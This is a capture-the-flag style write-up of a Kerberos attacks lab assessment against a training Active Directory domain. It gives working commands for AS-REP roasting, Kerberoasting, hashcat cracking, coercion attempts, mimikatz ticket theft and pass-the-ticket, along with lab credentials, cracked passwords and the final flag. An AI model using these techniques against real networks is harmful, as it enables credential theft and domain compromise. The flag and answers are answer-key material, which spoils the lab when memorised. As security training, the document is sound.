# Kerberos Attacks — Skills Assessment

## Scenario

Inlanefreight tasked us with an internal penetration test. We connect via RDP to a Linux attack box and attack the `172.16.8.0/24` (`INLANEFREIGHT.LOCAL`) network, using an OSINT-derived username list (`usersSA.zip`) to gain a foothold and ultimately read `\\DC01\Secret Share\flag.txt`.

Entry point: RDP to `10.129.205.121` (`ACADEMY-KERBATTCK-SA-ATTACK01`), user `htb-student` / `HTB_@cademy_stdnt!`.

## Environment note: GUI automation detour

The task instructions say to RDP in, but this box turned out to be a **Parrot Linux** desktop (not Windows), reachable with both RDP (3389) and **SSH (22)** externally — `nmap -p- 10.129.205.121` showed only those two ports open (SMB/Kerberos closed externally, confirming ATTACK01 is a pure jump box with a second NIC into `172.16.8.0/24`).

I first tried to drive the RDP session itself via `xfreerdp3` + `xdotool` + screenshots (no GUI viewer available, only a terminal). This hit two separate bugs:
- `ibus-chewing` (a Chinese IME) was intercepting plain keystrokes and converting them to Zhuyin composition instead of literal Latin characters. Fixed with `ibus engine xkb:us::eng`, but...
- `xdotool type`'s dynamic keycode remapping produced characters FreeRDP's X11 client couldn't map to an RDP scancode (`load_map_from_xkbfile: ... no RDP scancode found`), causing silently dropped/delayed keystrokes with confusing multi-second render lag.

Given SSH was open the whole time, I abandoned GUI automation entirely and used `paramiko` (Python SSH) to drive a real non-interactive shell on ATTACK01 — far more reliable for scripted enumeration. Lesson: check for a CLI path (SSH) before fighting a GUI automation loop.

## q1 — Valid domain user from the list

`usersSA.zip`/`users.txt` (despite the `.txt` extension, a disguised zip) contained 29 candidate usernames. ATTACK01 already had a plaintext `users.txt` (CRLF) with the same list and `/etc/hosts` mapping `INLANEFREIGHT.LOCAL` — added `dc01.inlanefreight.local` → `172.16.8.3` as the task note requested.

AS-REP roasted the whole list against the DC:

```bash
GetNPUsers.py inlanefreight.local/ -usersfile users.txt -no-pass -dc-ip 172.16.8.3
```

All 29 users returned `doesn't have UF_DONT_REQUIRE_PREAUTH set` **except** `daniel.whitehead`, which returned a `$krb5asrep$23$...` hash — confirming it's a valid, AS-REP-roastable account.

Cracked offline:

```bash
hashcat -m 18200 daniel.asrep /usr/share/wordlists/rockyou.txt
# daniel.whitehead:dolphin
```

**Answer: `daniel.whitehead`**

## q2 — Machine with unconstrained delegation

With `daniel.whitehead:dolphin`, queried AD directly for computers with the unconstrained-delegation UAC bit (`TRUSTED_FOR_DELEGATION` = `0x80000`, filter `userAccountControl:1.2.840.113556.1.4.803:=524288`):

```bash
ldapsearch -x -H ldap://172.16.8.3 -D 'daniel.whitehead@inlanefreight.local' -w dolphin \
  -b 'DC=inlanefreight,DC=local' \
  '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  dNSHostName sAMAccountName
```

Returned `DC01$` (trivially true for any DC) and `SERVER01$` — the real answer.

**Answer: `SERVER01`**

## q3 — User with admin on SERVER01

Kerberoasted the domain with the same creds to find service accounts:

```bash
GetUserSPNs.py inlanefreight.local/daniel.whitehead:dolphin -dc-ip 172.16.8.3 -request
```

Found `annette.jackson` with SPN `HTTP/inlanefreight.local:1433`. Cracked the TGS hash:

```bash
hashcat -m 13100 annette.tgs /usr/share/wordlists/rockyou.txt
# annette.jackson:horses
```

Verified admin access:

```bash
crackmapexec smb 172.16.8.35 -u annette.jackson -p horses -d inlanefreight.local
# [+] inlanefreight.local\annette.jackson:horses (Pwn3d!)
```

And confirmed via WinRM (`net localgroup administrators` on SERVER01 lists `annette.jackson` directly, plus `SeDebugPrivilege` enabled).

**Answer: `annette.jackson`**

## q4 — Content of `\\DC01\Secret Share\flag.txt`

Directly accessing the share as `daniel.whitehead` or `annette.jackson` gave `NT_STATUS_ACCESS_DENIED` (share exists, visible via `smbclient -L`, but neither account has read rights). A privileged identity is needed — and SERVER01 has **unconstrained delegation**, so any Kerberos auth that reaches it gets its TGT cached in LSASS for us to steal, per the hint: *"If a user logs in, we can steal their identity."*

### Dead ends: active coercion

Tried to force the DC's machine account to authenticate to SERVER01 so its TGT would land there:

- **PetitPotam (MS-EFSRPC via `\PIPE\lsarpc`)** — bound fine, `EfsRpcOpenFileRaw` patched (`RPC_ACCESS_DENIED`), fell back to `EfsRpcEncryptFileSrv`, got the textbook "success" signature (`STATUS_PIPE_DISCONNECTED`) — but checking SERVER01's LSASS and event log afterward showed **zero** inbound connection from DC01. Tried `-pipe all`, FQDN vs IP targets (IP forces NTLM, which can't carry a forwardable TGT — switched to FQDN) — still nothing.
- **DFSCoerce (MS-DFSNM `NetrDfsRemoveStdRoot` via `\PIPE\netdfs`)** — wrote a minimal impacket NDR call by hand (no `dfsnm` module in this impacket build). Pipe open, call sent, `rpc_s_access_denied` (expected — ACL check happens after the coercion side-effect in the public PoC) — still no callback.
- **PrinterBug / ShadowCoerce** — `spoolss` and `FssagentRpc` named pipes both closed on DC01 (`STATUS_OBJECT_NAME_NOT_FOUND`); services not running. Not viable here.

Conclusion: this lab's DC either firewalls outbound connections to member servers or doesn't process these RPC coercions — active coercion is a dead end on this box.

### The real path: a scheduled task's identity

While checking SERVER01's Security event log for any trace of the coercion attempts, I noticed **regular `4624` logon events from `172.16.8.3` every 3 minutes**, all for the same account:

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[EventData[Data[@Name='IpAddress']='172.16.8.3']]" -MaxEvents 200 |
  ForEach-Object { "$($_.TimeCreated) | $($_.Properties[5].Value)" }
```

Every single hit (going back to 2023 in this lab template) was **`jake.kirk`**, Kerberos, logon type 3 — a persistent simulated scheduled task on the DC that logs into SERVER01 as `jake.kirk` every ~3 minutes. Since `jake.kirk`'s AD account has no `NOT_DELEGATED` flag (`userAccountControl: 66048` = normal account + don't-expire-password only), his TGT should be forwardable to SERVER01's unconstrained delegation.

**Catching it was the hard part** — the cached ticket only exists in SERVER01's LSASS for a very short window around each 3-minute mark:
- A naive poll every 20–30s (even over multiple full cycles) found nothing.
- A **tight sub-second loop running locally on SERVER01** (via a PowerShell script launched through `psexec.py`, looping `mimikatz.exe` every ~250ms for 5 minutes) *also* found nothing — because I'd dropped `privilege::debug` from that specific invocation, silently limiting `sekurlsa::tickets` to the caller's own session.
- Fixing that and re-running the 5-minute tight loop **still** found nothing, which was confusing until I realized: a WinRM/PSRP (`pypsrp`) one-shot command, run right at the correct few-second window, DID catch it — twice, non-reproducibly via the psexec loop. The actual blocker turned out to be simpler: `mimikatz.exe "sekurlsa::tickets /export"` writes the `.kirbi` file to its **current working directory**, which for a fresh WinRM session is `C:\Users\annette.jackson\Documents`, not `C:\Windows\Temp` where I kept looking.

Final working sequence, timed to land within a few seconds of a `jake.kirk` logon (polled every ~4–8s via WinRM, caught on the right iteration):

```powershell
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# ... Saved to file [0;297b79]-2-0-60a10000-jake.kirk@krbtgt-INLANEFREIGHT.LOCAL.kirbi !
```

Then, from a `psexec.py` SYSTEM shell on SERVER01 (same logon session needed for `kerberos::ptt` to persist for the follow-up SMB access):

```cmd
C:\Windows\Temp\mimikatz.exe "privilege::debug" "kerberos::ptt C:\Users\annette.jackson\Documents\[0;297b79]-2-0-60a10000-jake.kirk@krbtgt-INLANEFREIGHT.LOCAL.kirbi" "exit"

klist
#> Client: jake.kirk @ INLANEFREIGHT.LOCAL
#> Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
#> Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize

dir "\\dc01.inlanefreight.local\Secret Share"
#>  flag.txt    32 bytes

type "\\dc01.inlanefreight.local\Secret Share\flag.txt"
```

**Flag: `1ef37acac52540fb3fa05924fcb1103a`**

## Cleanup

- Removed all uploaded `mimikatz.exe` / `*.kirbi` / helper scripts from SERVER01 (`C:\Windows\Temp` and `C:\Users\annette.jackson\Documents`).
- Stopped and deleted every leftover `psexec.py`-created service (`sc.exe stop` / `sc.exe delete`) and the randomly-named uploaded binaries left in `C:\Windows`.
- Killed local `socat`/`xfreerdp3` processes and portproxy rules from the GUI-automation detour.

## Key takeaways

- When a task says "RDP in" but SSH is also open, prefer SSH — it's vastly more scriptable than driving a remote GUI blind via `xdotool` + screenshots.
- `mimikatz`/mimikatz-style tools write exported ticket files relative to **current working directory**, which differs by connection method (WinRM's default CWD is the user's `Documents` folder, not `C:\Windows\Temp`) — always confirm with a `dir` rather than assuming.
- Unconstrained delegation abuse doesn't require coercion if something *already* authenticates to the delegation box periodically — check the Security event log (`4624` filtered by source IP) before building a coercion chain; it can reveal the intended "someone logs in" path directly.
- `kerberos::ptt` only persists for the lifetime of the logon session it's injected into — do the ptt and the subsequent resource access in the *same* shell/session (e.g. one continuous `psexec.py` SYSTEM shell), not across separate one-shot WinRM calls.
